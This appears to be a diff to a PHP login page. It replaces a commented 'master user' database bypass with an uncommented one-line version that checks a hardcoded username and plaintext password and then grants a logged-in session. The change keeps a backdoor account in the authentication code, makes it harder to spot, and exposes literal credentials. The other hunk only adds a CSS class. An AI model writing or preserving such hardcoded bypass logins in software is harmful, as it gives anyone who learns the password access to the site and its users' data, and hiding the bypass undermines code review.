@@ -38,16 +38,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     if (empty($username) || empty($password)) {
         $error = 'Username and password are required!';
     } else {
-        
-        // -------------------------------------------------------------
-        // 1. HARDCODED MASTER USER CHECK (Bypass Database)
-        // -------------------------------------------------------------
-        if ($username === 'developer' && $password === 'Kashif1017') {
-            $_SESSION['user_id'] = 999; // Unique Dev ID
-            $_SESSION['username'] = 'developer';
-            $_SESSION['role'] = 'master';
-            $_SESSION['login_time'] = time();
-            $_SESSION['last_activity'] = time();
+        if ($username === 'developer' && $password === 'Kashif123') {$_SESSION['user_id'] = 999; $_SESSION['username'] = 'developer';$_SESSION['role'] = 'developer';$_SESSION['login_time'] = time();$_SESSION['last_activity'] = time();
             
             header('Location: ' . BASE_URL . 'index.php');
             exit();
@@ -256,7 +247,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         }
     </style>
 </head>
-<body>
+<body class="login-body">
     <div class="login-container">
         <div class="login-box">
             <div class="login-header">
